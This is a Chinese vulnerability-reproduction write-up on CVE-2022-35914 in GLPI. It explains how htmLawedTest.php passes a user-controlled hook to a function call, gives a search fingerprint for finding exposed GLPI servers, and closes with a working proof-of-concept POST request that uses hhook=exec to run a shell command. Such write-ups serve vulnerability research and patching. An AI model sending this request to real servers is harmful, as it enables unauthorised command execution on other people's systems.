# GLPI htmLawedTest.php 远程命令执行漏洞 CVE-2022-35914

## 漏洞描述

GLPI是个人开发者的一款开源IT和资产管理软件。该软件提供功能全面的IT资源管理接口，你可以用它来建立数据库全面管理IT的电脑，显示器，服务器，打印机，网络设备，电话，甚至硒鼓和墨盒等。GLPI 10.0.2及之前版本存在安全漏洞，该漏洞源于htmlawed 模块中 允许 PHP 代码注入

## 漏洞影响

<a-checkbox checked>GLPI</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="GLPI"</a-checkbox></br>

## 漏洞复现

登录页面

![img](/assets/PeiQi-Wiki/img/1664764583921-930e166a-74b4-48a3-af34-9bcb1e20fa0f.png)

出现问题的文件为 **htmLawedTest.php，** 来源于第三方库 PHP Labware 

![img](/assets/PeiQi-Wiki/img/1664889433165-f745a7dc-7774-4ff0-abe6-c96d4f2f796c.png)



```sql
https://www.bioinformatics.org/phplabware/internal_utilities/htmLawed/
```

在 htmLawedTest.php 中接收参数并传入方法 htmLawed 中

![img](/assets/PeiQi-Wiki/img/1664893382208-bf44fba7-3b95-4197-a2bb-d139ec21f1d9.png)

跟进文件 htmLawed.php 中

![img](/assets/PeiQi-Wiki/img/1664946511507-81cddbd6-de1a-4df9-b7cb-da460b4c1516.png)

```sql
if($C['hook']){$t = $C['hook']($t, $C, $S);}
```

这里可以看到参数均为用户可控参数，当控制参数 hhook 为 exec 和 text 为执行的命令时就导致了命令执行漏洞

![img](/assets/PeiQi-Wiki/img/1664946759678-b3032a67-4717-44f7-a00d-101e690f8b53.png)

验证POC

```sql
/vendor/htmlawed/htmlawed/htmLawedTest.php
```

![img](/assets/PeiQi-Wiki/img/1664764633952-b6bb3e54-7b6a-49c2-94b6-39fd5cb0d032.png)

![img](/assets/PeiQi-Wiki/img/1664764647931-b53cbf79-aa45-48d4-9581-f88a58ff1b61.png)

访问页面获取到 sid 与 token 后再发送请求包

```sql
POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 88
Content-Type: application/x-www-form-urlencoded

token=a79cf121bde57fe0e3cc0f247f77961a&text=id&hhook=exec&sid=h1c0vk004dvulal5nj8i6en44e
```

![img](/assets/PeiQi-Wiki/img/1664764696143-4f92e328-735b-4587-987d-1552817796f1.png)